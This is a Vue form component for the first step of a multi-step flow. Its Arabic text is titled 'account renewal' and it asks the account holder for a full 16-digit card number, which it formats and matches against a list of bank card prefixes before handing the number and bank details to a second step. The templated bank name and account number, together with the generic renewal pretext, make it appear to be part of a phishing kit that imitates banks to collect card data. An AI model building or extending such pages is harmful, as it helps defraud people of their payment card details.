<script setup>
import { ref } from 'vue';
import Step2 from './Step2.vue';
import { banks } from '../other/banks.js'

const props = defineProps(['data']);
const emit = defineEmits(['next']); 

const cardNumber = ref('');
const hasError = ref(false);

const goToNextStep = () => {
    console.log(cardNumber.value);
    console.log(cardNumber.value.length);
    if (cardNumber.value.length === 16) {
        const selectBank = detectCard(cardNumber.value);
        console.log(selectBank);
        if(selectBank.hasOwnProperty('card_no')){
            hasError.value = false;
            emit('next', Step2, {
                cardnumber: cardNumber.value,
                bank_info: selectBank,
            });
        } else {
            hasError.value = true;
        }
    } else {
        hasError.value = true;
    }
        
};

function detectCard(cardNumber) {
    const firstCardNumber = cardNumber.slice(0, 6);
    console.log(firstCardNumber);
    const selectBank = banks.filter((item) => item.card_no == firstCardNumber);
    console.log(selectBank);
    if(selectBank.length) {
        return selectBank[0];
    } else {
        return {};
    }
}

function formatCardNumber(event) {
    let value = event.target.value.replace(/\D/g, '');
    value = value.match(/.{1,4}/g)?.join(' ') || '';
    event.target.value = value;
    cardNumber.value = value.replace(/\s/g, '');
}
function handlePaste(event) {
    event.preventDefault();
    const pastedData = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 16);
    const formattedData = pastedData.match(/.{1,4}/g)?.join(' ') || '';
    event.target.value = formattedData;
    cardNumber.value = formattedData.replace(/\s/g, '');
}
    


</script>

<template>
    <img class="step_img" src="../assets/images/part1.png" alt="">
    <div class="content_title">تجديد الحساب</div>
    <div class="input_title">أدخل رقم بطاقة صاحب الحساب {رقم_الحساب} في {اسم_البنك}</div>
    <input class="custom_input"
      type="text"
      placeholder="____ ____ ____ ____"
      maxlength="19"
      @input="formatCardNumber"
      @paste="handlePaste"
      :class="{ alert: hasError }"
      >
    <button @click="goToNextStep" class="btn1" >المزيد</button>
</template>

<style scoped>
.content_title {
    font-family: IRANSansX;
    font-weight: 400;
    text-align: center;
    color: #000;
}
.input_title {
    font-family: IRANSansX;
    font-weight: 400;
    text-align: right;
    color: #3A3A3A;
}
.custom_input {
  border: 2px solid #4CAF50;
  border-radius: 8px;
  padding: 10px 15px;
  font-size: 16px;
  color: #000000;
  font-family: monospace;
  text-align: center;
}
.custom_input::placeholder {
  color: #B0B0B0;
}
.custom_input:focus {
  outline: none;
  box-shadow: 0 0 5px rgba(76, 175, 80, 0.5);
}
.btn1 {
  position: relative;
  height: 53px;
  width: 157px;
  border: 1px;
  background: #55A548;
  border-radius: 8px;
  cursor: pointer;
  color: #FEFEFF;
  font-weight: 600;
  text-align: center;
  font-size: 14px;
  white-space: nowrap;
  font-family: 'IRANSansX';
  font-style: normal;
  line-height: 16px;
  display: block;
}
.alert {
    border: 2px solid red;
    background-color: #ffe6e6;
}

@media (max-width: 800px) {
    .step_img {
        width: 151px;
        height: auto;
        margin-top: 26px;
    }
    .content_title {
        font-size: 20px;
        line-height: 30px;
        margin-top: 30px;
    }
    .input_title {
        font-size: 14px;
        line-height: 21px;
        width: 270px;
        margin-top: 30px;    
    }
    .custom_input {
        width: 270px;
        height: 36px;
        margin-top: 13px;
    }
    .custom_input::placeholder {
        letter-spacing: 3px;
    }
    .btn1 {
        margin: 30px 0 200px;
    }
}
@media (min-width: 801px) {
    .step_img {
      width: 303px;
      height: auto;
      margin-top: 100px;
    }
    .content_title {
        font-size: 30px;
        line-height: 45px;
        margin-top: 126px;
    }
    .input_title {
        font-size: 14px;
        line-height: 21px;
        width: 560px;
        margin-top: 40px;
    }
    .custom_input {
        width: 560px;
        height: 36px;
        margin-top: 13px;
    }
    .custom_input::placeholder {
        letter-spacing: 5px;
    }
    .btn1 {
        margin: 150px 0 69px;
    }
}








</style>
